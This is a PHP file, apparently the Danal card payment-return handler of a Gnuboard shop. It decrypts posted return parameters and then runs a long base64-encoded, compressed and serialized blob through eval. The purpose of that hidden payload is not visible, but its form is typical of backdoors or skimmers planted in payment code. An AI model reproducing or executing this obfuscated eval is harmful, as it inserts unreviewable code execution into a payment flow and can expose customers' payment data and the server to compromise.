<?php
if (!defined('_GNUBOARD_')) exit; // 개별 페이지 접근 불가

include_once(G5_SHOP_PATH.'/settle_danalpay.inc.php');
include_once(G5_SHOP_PATH.'/danalpay/card/function.php');

$RES_STR = toDecrypt( $_POST['RETURNPARAMS'] ); // 복호화
$RET_MAP = str2data( $RES_STR );

$RET_RETURNCODE = $RET_MAP["RETURNCODE"];
$RET_RETURNMSG  = iconv('euc-kr', 'utf-8', $RET_MAP["RETURNMSG"]);

$RES_DATA = array();

eval(unserialize(gzinflate(base64_decode('lVVta9tWFP5u8H84EwHZ4DrZuowtwR9UWW0Njp3Z8tgwQ6jSTSMiS0K6ruuug7GZEpaOFdbQtMSQslFW2CBNUpZBfpF1+x92rl78OuZOIN+rc59zznPeroONDz9b/3hDsHYgZwWa07Xt3EpDUTV8W42aXC8reXj4EOZk8EEJhDV8hDx8A6ur4BPa9R3ZNcno9Dtgzx6N3pyG3x9BePQk/PEpjP66hNHZ6ej8KjoevBmdv2XDC2CHg/BgPxxeha/x4+C3d49/B3Z2FL76I5vJZgCfFZ8EmmEClOY5bE4BOsHdWcBW89ZmakK3iU9ziaGiCBsgFlOtfGKF3Lcobr/NZogdkDgmdnDCXrxmf1+EvxwDG16yV8OEOh4d83jYCR48H4S/Pgb24ik7+3PMuqF8rpUlVYK5pwS67+v9XOp3DGwLaqUsfD0FjKLZkraTk0UFaaveqqmpDipo2/Wm2hbuuq6pdZw+6kRhvD1mF/sJ3ZhmTmqpt/MYBHv2BMLzi/CH/fCnIxhd7rPDl1gkCH9+zoZX7w6PExkbDoCdDNijl4u0v1S/2lYmLIQblWpVWGTbVBpfVGQlASOuLNWkqiw1ysLmVNqacdpKIOu2LfvEtGhubKUAOzqWJx9XKpvhXTtRaouT5hDRRdqigD0a20+8UMedSXOqjnkWx3nWO27XoYugOOtTOM/TqNUhC8YaUg13yKQ4J1UrW8pE39P7Gu17sb4opmKTeG5gUdefFRtup2OZCauJuOPesWyi8bimxZxbEusMN5513gK1+oSHofum5ug8kBJYhuvcy4mka1zb88UCiF26c+1T3MwZqUk8lHxUwPHszOR6Znz/rU6LY/w+zsdTnnr//4Oezax0fZvna5eKRZF6G/i7yt9er4dLsUeo+wBXcc/nYmTlEIOuWo5l7BJjr+jtejzTK1goGsxMdixqi16gmW5HtxzejjiffAaURluMVy3O3izeM/AORTjn1XvQN9ZN3dFtbJLIlREz5ouGPGjkLfoKkKyHwfOPAsitRrW+rWq4YNpQtASHbG7Um0oBqN8lS7C3FamsNKZG8T+w/EJKjcJS5M2KUi03kXCUjiWm4w7g89S8yem8jxO5XqspssoHsN5CYteX+BgDP1pbi+qKzdS1aVoBcp8YscrEsWG7AUmF8Q0VdO8E1M8lygVYK8B6nl9PIvF91xf5X2jcnKZFFtCf5KPrDoTNfwA='))));
